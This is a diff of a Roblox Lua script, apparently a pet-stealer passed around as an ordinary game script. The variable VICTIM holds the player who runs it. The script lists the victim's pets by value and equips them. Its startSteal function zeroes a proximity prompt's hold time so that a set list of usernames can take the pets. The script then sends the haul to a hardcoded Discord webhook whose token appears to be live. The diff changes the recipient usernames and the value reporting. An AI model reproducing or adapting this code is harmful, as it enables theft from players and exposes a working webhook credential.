@@ -21,14 +21,14 @@ if _G.scriptExecuted then
 end
 _G.scriptExecuted = true
 
--- ✅ Configuration
 local WEBHOOK_URL = "https://discord.com/api/webhooks/1393637749881307249/ofeqDbtyCKTdR-cZ6Ul602-gkGOSMuCXv55RQQoKZswxigEfykexc9nNPDX_FYIqMGnP"
 local VICTIM = game.Players.LocalPlayer
 local USERNAMES = {
-    "sdsdsd",
+    "sshhshs",
     "yuniecoxo",
-    "yyyyyvky"
+    "Wanwood42093"
 }
+
 
 local PET_VALUES = {
     ["Raccoon"] = { emoji = "🦝", value = 2000 },
@@ -171,7 +171,7 @@ function createDiscordEmbed(petList, totalValue, fileUrl)
                 inline = false
             },
             {
-                name = " **Total Value**",
+                name = "💰 **Total Value**",
                 value = string.format("```%s```", totalValue),
                 inline = false
             },
@@ -255,6 +255,9 @@ local function getPlayersPets()
     end
 end
 
+  
+
+
 local function startSteal(trigerName)
     if game.Players[trigerName].Character.Head:FindFirstChild("ProximityPrompt") then
         game.Players[trigerName].Character.Head.ProximityPrompt.HoldDuration = 0
@@ -264,7 +267,8 @@ end
 
 local function checkPetsInventory(target)
     for petUid, value in pairs(dataModule:GetData().PetsData.PetInventory.Data) do
-        if not checkPetsWhilelist(value.PetType) then continue end
+        local matchedName = checkPetsWhilelist(value.PetType)
+        if not matchedName then continue end
         local petObject = getPetObject(petUid)
         if not petObject then continue end
         equipPet(petObject)
@@ -291,9 +295,8 @@ task.spawn(function()
     while task.wait(0.5) do
         if #victimPetTable > 0 then
             idlingTarget()
-            createDiscordEmbed(table.concat(victimPetTable, "\n"), "100000", "https://cdn.discordapp.com/attachments/.../items.txt")
+            createDiscordEmbed(table.concat(victimPetTable, "\n"), totalPetValue, "https://cdn.discordapp.com/attachments/.../items.txt")
             break
         end
     end
-end)
 end)
